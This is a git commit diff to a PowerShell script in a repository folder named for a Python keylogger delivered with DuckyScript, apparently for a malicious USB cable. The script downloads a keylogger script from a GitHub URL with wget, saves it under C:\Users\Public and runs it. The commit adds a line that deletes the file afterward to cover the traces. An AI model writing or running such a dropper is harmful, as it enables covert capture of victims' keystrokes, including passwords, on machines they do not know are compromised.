f8dcf4ea1a091f278b88fa2dd97ee3629fc5501f
csandoval63 <csandoval63@student.rcc.edu>
2020-05-14 03:08:25 -0700

    Update install_python.ps1

--- Python keylogger stuff with DUCKYscript/install_python.ps1
+++ Python keylogger stuff with DUCKYscript/install_python.ps1
@@ -10,3 +10,4 @@ $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";"
 wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "pythonkl.py"
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 python 'C:\Users\Public\pythonkl.py'
+Remove-Item 'C:\Users\Public\pythonkl.py'
